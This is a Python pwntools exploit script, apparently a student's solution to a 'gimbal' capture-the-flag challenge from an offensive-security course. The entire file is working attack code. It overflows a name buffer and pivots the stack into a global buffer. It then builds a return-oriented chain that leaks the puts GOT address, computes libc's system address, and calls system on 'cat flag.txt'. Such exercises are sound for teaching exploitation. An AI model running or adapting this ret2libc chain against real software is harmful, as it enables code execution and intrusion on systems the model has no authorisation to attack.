#!/usr/bin/python

from pwn import *
debug = True
p = ""
libc = ""
if debug:
    p = process("./gimbal")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.26.so")
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1344)
    p.sendline("krm504")
    p.recvline()
    libc = ELF("libc-2.19.so")
    pause(1)

#Get offset to system
puts = libc.symbols[b'puts']
system = libc.symbols[b'system']
sysoff = puts-system

buffOffset  = 0x1f00
nameBuffLoc = 0x601080 + buffOffset # Get to the middle to allow some room
popRDI = p64(0x00400793)
popRSI15 = p64(0x00400791)
readCall = p64(0x400530)
putsCall = p64(0x400520)
putsGOT = p64(0x601018)

# Set up the call to any command (make sure to change into interactive at the bottom instead)
command = "cat flag.txt\x00"
stack1Size = 0x50
stack2Size = 0x18
commandLoc = nameBuffLoc-buffOffset

# Fill the first buffer with useful stuff
exploit = command + 'A'*(buffOffset-len(command)) + p64(nameBuffLoc+0x10) + popRDI + putsGOT + putsCall + popRDI + p64(0) + popRSI15 + p64(nameBuffLoc+stack1Size) + p64(0) + readCall # + Should be set to system
exploit += '\x00'*(0x2000-len(exploit))
p.recvline() # Name?
p.send(exploit)

# Set up the pivot into my new stack that's nicely in memory for me
p.recvline() # Name??
p.send('A'*0x20+p64(nameBuffLoc))
p.recvline()

# Get the address of the system function, and set up the call to it, and send
putsReal = p.recv(6)
realSystem = u64(putsReal+'\x00'*(8-len(putsReal))) - sysoff
exploit = popRDI + p64(commandLoc) + p64(realSystem)
p.sendline(exploit)

p.recvuntil('{')
print("flag{" + p.recvuntil('}'))
